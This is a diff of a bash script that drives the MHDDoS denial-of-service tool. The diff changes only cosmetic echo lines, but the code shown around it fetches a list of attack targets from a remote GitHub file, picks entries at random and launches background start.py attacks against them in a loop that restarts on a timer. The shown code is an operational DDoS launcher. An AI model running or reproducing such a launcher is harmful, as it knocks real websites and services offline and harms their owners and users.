@@ -27,10 +27,12 @@ cd MHDDoS
 pip install -r requirements.txt > /dev/null #(no output on screen)
 
 while true
+
 do
    # Get number of targets in MHDDoS_targets. First 5 strings ommited, those are reserved as comments.
    list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6 | wc -l)
-
+   
+   echo "#####################################"
    echo -e "\nNumber of targets in list: " $list_size "\n"
 
    # Create list with random numbers
@@ -57,11 +59,12 @@ do
             # Cut "command line" from string. Command line is everything before "#" that is used as delimiter for comments purpose.
             cmd_line=$(echo $site | awk -F "#" '{print $1}')
             
-            echo $cmd_line
+            #echo $cmd_line
             sleep 1
             
             python3 ~/MHDDoS/start.py $cmd_line&
    done
+echo "#####################################"
 sleep $restart_interval
 echo -e "/n RESTARTINg /n"
 pkill -f start.py
